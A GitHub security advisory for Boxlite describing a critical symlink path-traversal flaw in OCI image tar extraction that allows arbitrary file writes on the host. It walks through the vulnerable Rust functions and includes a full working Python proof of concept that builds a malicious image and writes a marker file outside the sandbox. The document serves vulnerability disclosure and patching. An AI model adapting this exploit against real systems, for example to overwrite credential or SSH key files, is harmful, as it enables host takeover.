# [C] Boxlite: Path Traversal Vulnerability Leads to Arbitrary File Write on the Host

## Summary
Severity: Critical
Advisory: GHSA-f396-4rp4-7v2j
CVE: CVE-2026-46703
CWE: CWE-22
Ecosystem: Go, PyPI, crates.io, npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-21
Source: https://github.com/advisories/GHSA-f396-4rp4-7v2j
Type: github-advisory

## Affected
- PyPI: `boxlite` — affected >=0 <0.9.0
- crates.io: `boxlite-cli` — affected >=0 <0.9.0
- crates.io: `boxlite` — affected >=0 <0.9.0
- npm: `@boxlite-ai/boxlite` — affected >=0 <0.9.0
- Go: `github.com/boxlite-ai/boxlite/sdks/go` — affected >=0 <0.9.0

## Details
#### Summary

Boxlite is a sandbox service that allows users to create lightweight virtual machines (Boxes) and run OCI containers within them. Boxlite allows users to specify the OCI image used by containers in the sandbox. However, when processing tar entries in OCI images, Boxlite does not account for the possibility that entries may be symlinks pointing to absolute paths. An attacker can craft a malicious OCI image and distribute it on image hosting platforms such as DockerHub, tricking users into using it. Once a user loads the malicious image, the attacker can write arbitrary content to any path on the host, which can further lead to remote code execution on the host.



#### Details

1. Entry Point — OCI Layer Tarball Extraction

**File:** `boxlite/src/images/archive/tar.rs` **Function:** `extract_layer_tarball_streaming()` (line 24) **Code:**

```rust
pub fn extract_layer_tarball_streaming(tarball_path: &Path, dest: &Path) -> BoxliteResult<u64> {
    // ...
    apply_oci_layer(reader, dest)
}
```

**Issue:** The function passes the tar reader into `apply_oci_layer`. The tarball comes from a registry blob that has passed SHA256 integrity verification against the manifest digest — but the manifest itself is controlled by the registry, so a malicious registry can serve a valid manifest pointing to a crafted layer blob with a matching digest.

2. Main Extraction Loop — Symlink Created Without Target Validation

**File:** `boxlite/src/images/archive/tar.rs` **Function:** `apply_oci_layer()` (line 196) **Code:**

```rust
EntryType::Symlink => {
    let target = link_name.ok_or_else(|| { /* ... */ })?;
    create_symlink(&full_path, &target)?;  // line 327 — target is NOT validated
}
```

**Issue:** The symlink's `full_path` (the link itself) is sanitized by `normalize_entry_path` to stay within `dest`. However, the `target` (what the symlink points to) is never validated. An entry with path `usr` and link target `/etc` creates `{dest}/usr -> /etc`, a symlink pointing outside the extraction root. There is no check that `target` stays within `dest`, is relative, or doesn't escape the container root.

3. Symlink Target Written Verbatim

**File:** `boxlite/src/images/archive/tar.rs` **Function:** `create_symlink()` (line 747) **Code:**

```rust
fn create_symlink(path: &Path, target: &Path) -> BoxliteResult<()> {
    std::os::unix::fs::symlink(target, path).map_err(|e| { /* ... */ })
}
```

**Issue:** `std::os::unix::fs::symlink` is an `lstat`-level operation — it creates the symlink with the provided target string verbatim, no matter what it contains. If `target` is `/etc`, the link records `/etc` as the target. No containment check.

4. ensure_parent_dirs Deliberately Follows and Preserves Escape Symlinks

**File:** `boxlite/src/images/archive/tar.rs` **Function:** `ensure_parent_dirs()` (line 457) **Code:**

```rust
Ok(m) if m.file_type().is_symlink() => {
    // Check if symlink points to a directory
    match fs::metadata(current_check) {  // follows symlink
        Ok(target_m) if target_m.is_dir() => {
            trace!("Preserving symlink that points to directory: ...");
            break;  // line 516 — stop, keep the symlink, treat as valid parent
        }
```

**Issue:** When the next tar entry has path `usr/passwd` and the code calls `ensure_parent_dirs("{dest}/usr/passwd", dest)`, it walks up to `{dest}/usr`, finds it is a symlink pointing to a directory (e.g., `/etc`), and explicitly **breaks** the loop to preserve it — treating the out-of-root symlink as a valid, navigable parent. The `create_dir_all` call is then skipped for this path. The caller proceeds to open and write `{dest}/usr/passwd`, which the kernel resolves through the symlink to `/etc/passwd`.

5. File Written Through Escaped Symlink

**File:** `boxlite/src/images/archive/tar.rs` **Function:** `create_regular_file()` (line 715) **Code:**

```rust
fn create_regular_file<R: Read>(entry: &mut Entry<R>, path: &Path, mode: u32) -> BoxliteResult<()> {
    let mut file = OpenOptions::new()
        .write(true).create(true).truncate(true).mode(mode)
        .open(path)   // path = "{dest}/usr/passwd" which kernel follows to "/etc/passwd"
        .map_err(|e| { /* ... */ })?;
    io::copy(entry, &mut file)?;   // attacker-controlled content written to /etc/passwd
    Ok(())
}
```

**Issue:** `OpenOptions::open()` follows symlinks in path components by default. The kernel resolves `{dest}/usr/passwd` → `{dest}/usr` is a symlink to `/etc` → file opened at `/etc/passwd`. Attacker-controlled tar entry content is copied there verbatim.



As seen from the code, when a tar entry is a symlink, Boxlite's security checks are insufficient. An attacker can exploit this vulnerability to achieve arbitrary file write once a user loads a maliciously crafted image. The write permission is consistent with the process privilege running the Boxlite service, which is commonly root on Linux. The attacker can further leverage this capability to achieve remote code execution, such as writing the attacker's public key into the host's authorized_keys.



#### PoC

1. Install Boxlite following the official tutorial.

2. Run the following Python script:

   ```python
   #!/usr/bin/env python3
   """
   PoC: BoxLite OCI Layer Extraction Symlink Escape
   =================================================
   
   Vulnerability: boxlite/src/images/archive/tar.rs — extract_layer_tarball_streaming()
   Type:          CWE-61 / CAPEC-132 — Symlink Following during tar extraction
   
   Attack:
     OCI images consist of layer tarballs extracted on the host to build the ext4
     base image. If the extractor follows a symlink without verifying the resolved
     path stays within the extraction root, an attacker can craft a tar like:
   
       [1] SYMLINK  escape  ->  /tmp          (points to host /tmp)
       [2] FILE     escape/poc/pwned.txt       (resolves via [1] to /tmp/poc/pwned.txt)
   
     KVM hardware isolation is irrelevant here — tar extraction happens in the host
     process before the VM ever starts.
   
   Target write: /tmp/boxlite_host_escape/pwned.txt
   Expected isolation boundary: boxlite internal staging dir under /tmp
   """
   
   import asyncio
   import hashlib
   import io
   import json
   import os
   import shutil
   import tarfile
   import time
   
   TARGET_FILE = "/tmp/boxlite_host_escape/pwned.txt"
   OCI_LAYOUT_DIR = "/tmp/malicious_oci_layout"
   
   
   # ── Helpers ───────────────────────────────────────────────────────────────────
   
   
   def sha256hex(data: bytes) -> str:
       return hashlib.sha256(data).hexdigest()
   
   
   def add_entry(
       tf: tarfile.TarFile,
       name: str,
       type_: bytes,
       linkname: str = "",
       data: bytes = b"",
       mode: int = 0o644,
   ):
       info = tarfile.TarInfo(name=name)
       info.type = type_
       info.linkname = linkname
       info.size = len(data)
       info.mode = mode
       info.mtime = int(time.time())
       tf.addfile(info, io.BytesIO(data) if data else None)
   
   
   # ── Step 1: Build malicious OCI layer tar ─────────────────────────────────────
   
   
   def build_layer_tar() -> bytes:
       """
       Tar entries (order matters):
         [1] SYMLINK  escape            ->  /tmp
         [2] DIR      escape/boxlite_host_escape/     (resolves to /tmp/boxlite_host_escape/)
         [3] FILE     escape/boxlite_host_escape/pwned.txt  (resolves to /tmp/…/pwned.txt)
         [4] FILE     etc/os-release    (legitimate-looking decoy entries)
       """
       payload = (
           "===== BOXLITE SYMLINK ESCAPE: HOST FILESYSTEM WRITE =====\n"
           f"Written at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
           f"Target: {TARGET_FILE}\n"
           "========================================================\n"
       ).encode()
   
       buf = io.BytesIO()
       with tarfile.open(fileobj=buf, mode="w") as tf:
           add_entry(tf, "escape", tarfile.SYMTYPE, linkname="/tmp", mode=0o777)
           add_entry(tf, "escape/boxlite_host_escape", tarfile.DIRTYPE, mode=0o755)
           add_entry(
               tf, "escape/boxlite_host_escape/pwned.txt", tarfile.REGTYPE, data=payload
           )
           add_entry(
               tf,
               "etc/os-release",
               tarfile.REGTYPE,
               data=b"ID=alpine\nVERSION_ID=3.19.0\n",
           )
       return buf.getvalue()
   
   
   # ── Step 2: Build OCI image layout ───────────────────────────────────────────
   
   
   def build_oci_layout(out_dir: str) -> None:
       blobs = os.path.join(out_dir, "blobs", "sha256")
       os.makedirs(blobs, exist_ok=True)
   
       def write_blob(data: bytes) -> tuple[str, int]:
           dgst = sha256hex(data)
           with open(os.path.join(blobs, dgst), "wb") as f:
               f.write(data)
           return dgst, len(data)
   
       layer_bytes = build_layer_tar()
       layer_dgst, layer_sz = write_blob(layer_bytes)
   
       config_bytes = json.dumps(
           {
               "architecture": "amd64",
               "os": "linux",
               "config": {"Cmd": ["/bin/sh"]},
               "rootfs": {"type": "layers", "diff_ids": [f"sha256:{layer_dgst}"]},
           }
       ).encode()
       cfg_dgst, cfg_sz = write_blob(config_bytes)
   
       manifest_bytes = json.dumps(
           {
               "schemaVersion": 2,
               "mediaType": "application/vnd.oci.image.manifest.v1+json",
               "config": {
                   "mediaType": "application/vnd.oci.image.config.v1+json",
                   "digest": f"sha256:{cfg_dgst}",
                   "size": cfg_sz,
               },
               "layers": [
                   {
                       "mediaType": "application/vnd.oci.image.layer.v1.tar",
                       "digest": f"sha256:{layer_dgst}",
                       "size": layer_sz,
                   }
               ],
           }
       ).encode()
       mf_dgst, mf_sz = write_blob(manifest_bytes)
   
       with open(os.path.join(out_dir, "index.json"), "w") as f:
           json.dump(
               {
                   "schemaVersion": 2,
                   "manifests": [
                       {
                           "mediaType": "application/vnd.oci.image.manifest.v1+json",
                           "digest": f"sha256:{mf_dgst}",
                           "size": mf_sz,
                           "annotations": {"org.opencontainers.image.ref.name": "latest"},
                       }
                   ],
               },
               f,
           )
   
       with open(os.path.join(out_dir, "oci-layout"), "w") as f:
           json.dump({"imageLayoutVersion": "1.0.0"}, f)
   
       print(f"  layer    sha256:{layer_dgst[:16]}…  ({layer_sz} B)")
       print(f"  config   sha256:{cfg_dgst[:16]}…  ({cfg_sz} B)")
       print(f"  manifest sha256:{mf_dgst[:16]}…  ({mf_sz} B)")
   
   
   # ── Main ──────────────────────────────────────────────────────────────────────
   
   
   async def main():
       print("=" * 60)
       print("  PoC: BoxLite OCI Layer Extraction Symlink Escape")
       print("=" * 60)
   
       # Clean up previous run artifacts
       for path in [TARGET_FILE, "/tmp/boxlite_host_escape", OCI_LAYOUT_DIR]:
           if os.path.isfile(path):
               os.remove(path)
           elif os.path.isdir(path):
               shutil.rmtree(path)
   
       # [1] Build malicious OCI image
       print(f"\n[1] Building malicious OCI image → {OCI_LAYOUT_DIR}")
       build_oci_layout(OCI_LAYOUT_DIR)
   
       # [2] Show crafted tar entries
       print("\n[2] Malicious layer tar entries:")
       with open(os.path.join(OCI_LAYOUT_DIR, "index.json")) as f:
           idx = json.load(f)
       mf_dgst = idx["manifests"][0]["digest"].split(":")[1]
       with open(os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", mf_dgst)) as f:
           mf = json.load(f)
       lyr_dgst = mf["layers"][0]["digest"].split(":")[1]
       lyr_data = open(
           os.path.join(OCI_LAYOUT_DIR, "blobs", "sha256", lyr_dgst), "rb"
       ).read()
       with tarfile.open(fileobj=io.BytesIO(lyr_data)) as tf:
           for m in tf.getmembers():
               tstr = {
                   tarfile.REGTYPE: "FILE   ",
                   tarfile.SYMTYPE: "SYMLINK",
                   tarfile.DIRTYPE: "DIR    ",
               }.get(m.type, f"?{m.type}   ")
               suffix = f" -> {m.linkname}" if m.issym() else ""
               print(f"    {tstr}  {m.name}{suffix}")
   
       # [3] Confirm target absent before exploit
       print(f"\n[3] Pre-exploit — target exists? {os.path.exists(TARGET_FILE)}")
   
       # [4] Trigger extraction (vulnerability fires before VM starts)
       print(f"\n[4] Loading malicious image via boxlite.SimpleBox(rootfs_path=…)")
       import boxlite
   
       try:
           async with boxlite.SimpleBox(rootfs_path=OCI_LAYOUT_DIR) as box:
               r = await box.exec("sh", "-c", "echo ok")
               print(f"    VM stdout: {r.stdout.strip()}")
       except Exception as e:
           # Box may fail to start (incomplete rootfs) — that's fine;
           # the symlink escape occurs during layer extraction, before VM launch.
           print(f"    Box error (expected): {type(e).__name__}: {e}")
   
       # [5] Verify host write
       print(f"\n[5] Post-exploit — target exists? {os.path.exists(TARGET_FILE)}")
       if os.path.exists(TARGET_FILE):
           print(f"\n  VULNERABLE — host file written successfully!")
           print(f"  Path: {TARGET_FILE}")
           print(open(TARGET_FILE).read())
       else:
           print("\n  NOT VULNERABLE (or already patched)")
   
   
   if __name__ == "__main__":
       asyncio.run(main())
   ```

   This script constructs a malicious OCI image and passes it to the SimpleBox function via rootfs_path to create a container. In the malicious image, a symlink is first created pointing `escape` to `/tmp`, and then files are written under `escape`, thereby achieving file writes to the root filesystem.

   Sample output:

   ```
   $ python3 poc_symlink_escape.py
   ============================================================
     PoC: BoxLite OCI Layer Extraction Symlink Escape
   ============================================================
   
   [1] Building malicious OCI image → /tmp/malicious_oci_layout
     layer    sha256:a1e8b4de11d64fce…  (10240 B)
     config   sha256:8e245c2c65565998…  (191 B)
     manifest sha256:2dad6671e78d8093…  (415 B)
   
   [2] Malicious layer tar entries:
       SYMLINK  escape -> /tmp
       DIR      escape/boxlite_host_escape
       FILE     escape/boxlite_host_escape/pwned.txt
       FILE     etc/os-release
   
   [3] Pre-exploit — target exists? False
   
   [4] Loading malicious image via boxlite.SimpleBox(rootfs_path=…)
       Box error (expected): RuntimeError: internal error: Container init failed: Failed to start container: internal error: Failed to create container b673b4e3400c71bd72464c98610c952e2164f70f946873b82adf3e6212851d54 at bundle /run/boxlite/containers/b673b4e3400c71bd72464c98610c952e2164f70f946873b82adf3e6212851d54: failed to create container: exec process failed with error error in executing process : PATH environment variable is not set
   
   [5] Post-exploit — target exists? True
   
     VULNERABLE — host file written successfully!
     Path: /tmp/boxlite_host_escape/pwned.txt
   ===== BOXLITE SYMLINK ESCAPE: HOST FILESYSTEM WRITE =====
   Written at: ...
   Target: /tmp/boxlite_host_escape/pwned.txt
   ========================================================
   ```

   

#### Impact

An attacker can craft a malicious OCI image and distribute it on image hosting platforms such as DockerHub, tricking users into using it. Once a user loads the malicious image, the attacker can write arbitrary content to any path on the host, which can further lead to remote code execution on the host.



#### Score

Severity: Critical, Score: 9.7, rationale as follows:

- AV:N — The attacker can distribute the malicious image over the network, tricking users into pulling and using it
- AC:L — This is a logic vulnerability that requires no complex exploitation
- PR:N — The attacker does not need any additional privileges to exploit this vulnerability
- UI:R — The attacker needs to trick the victim into using the maliciously crafted image
- S:C — The attacker can leverage the vulnerability to achieve arbitrary command execution on the host, extending the impact to the host operating system and crossing the security boundary
- C:H/I:H/A:H — The attacker can leverage the vulnerability to gain RCE capability on the host, posing a significant threat to confidentiality, integrity, and availability



#### Credit

This vulnerability was discovered by:

- XlabAI Team of Tencent Xuanwu Lab
- Atuin Automated Vulnerability Discovery Engine

CVE and credit are preferred.

If you have any questions regarding the vulnerability details, please feel free to reach out to us for further discussion. Our email address is xlabai@tencent.com.



#### Note

Note that we follow the industry-standard **90+30 disclosure policy** (Reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). This means that we reserve the right to disclose the details of the vulnerability 30 days after the fix has been implemented.

## References
- https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-f396-4rp4-7v2j
- https://nvd.nist.gov/vuln/detail/CVE-2026-46703
- https://github.com/boxlite-ai/boxlite
- https://github.com/boxlite-ai/boxlite/releases/tag/v0.9.0
- https://rustsec.org/advisories/RUSTSEC-2026-0148.html
